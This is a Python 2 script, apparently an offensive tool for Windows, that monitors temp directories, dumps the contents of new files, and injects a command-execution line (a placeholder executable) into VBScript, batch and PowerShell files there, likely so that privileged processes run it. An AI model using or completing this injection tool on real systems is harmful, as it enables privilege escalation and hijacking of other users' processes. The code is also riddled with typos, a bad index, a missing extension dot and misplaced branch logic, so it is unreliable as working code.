import tempfile
import threading
import win32file
import win32con
import os

dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

#File modifications constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMDED_FROM = 4
FILE_RENAMED_TO = 5

file_types = {}
command = "C:\\WINDOWS\\TEMP\\<****SOME.EXE******AND*****ARGS>"
file_types['.vbs'] = ["\r\nmyMarker\r\n","CreateObject(\"Wscript.Shell\").run(\"%s\")\r\n" %command]
file_types['.bat'] = ["\r\nREM myMarker\r\n", "\r\n%s\r\n" %command]
file_types['ps1'] = ["\r\n#myMarker\r\n", "Start-Process\"%s\"\r\n" %command]

#Function to inject code

def injectCode(full_filename, extension, contents):
	#Check for marker in file 
	if file_types[extension][10] in contents:
		return

	full_contents =file_types[extension][0]
	full_contents += file_types[extension][1]
	full_contents += contents

	fd = open(full_filename, "wb")
	fd.write(full_contents)
	fd.close()

	print "[\\0/] Injected Code successfully"
	return

def startMonitor(path_to_watch):
	#Thread for each monitoring run 
	FILE_LIST_DIRECTORY = 0x0001
	directoryHand = win32file.CreateFile(path_to_watch, FILE_LIST_DIRECTORY,wn32con.FILE_SHARE_READ|win32con.FILE_SHARE_WRTIE|win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS,None)

	while 1:
		try:
			results = win32file.ReadDirectoryChangesW(
				directoryHand,
				1024,
				True,
				win32con.FILE_NOTIFY_CHANGE_FILE_NAME|
				win32con.win32con.FILE_NOTIFY_CHANGE_DIR_NAME|
				win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES|
				win32con.FILE_NOTIFY_CHANGE_SIZE|
				win32con.FILE_NOTIFY_CHANGE_LAST_WRTIE|
				win32con.FILE_NOTIFY_CHANGE_CHANGE_SECURITY,
				None,
				None)

			for action, file_name in results:
				full_filename = os.path.join(path_to_watch, file_name)
				if action == FILE_CREATED:
					print "[+] Created %s" %full_filename
				elif action == FILE_DELETED:
					print "[-] Deleted %s" %full_filename
				elif action == FILE_MODIFIED:
					print "[*] Modified %s" %full_filename

				print "[vvv] Dumping contents..."
				try:
					fd = open(full_filename, "rb")
					contents = fd.read()
					fd.close()

					print contents
					print "[^^^]Dump Complete!!"

				except:
					print "[!!!] Failed..!!"

				filename,extension = os.path.splittext(full_filename)
				if extension in file_types:
					injectCode(full_filename,extension,contents)

				elif action == FILE_RENAMDED_FROM:
					print "[>] Renamed from %s" %(full_filename)
				elif action == FILE_RENAMED_TO:
					print "[<] Renamed to: %s" %full_filename
				else:
					print "[???] Unknown: %s" %full_filename

				
		except:
			pass

for path in dirs_to_monitor:
	monitor_thread = threading.Thread(target=startMonitor,args=(path,))
	print "Spawing monitoring thread for path:  %s" %path
	monitor_thread.start()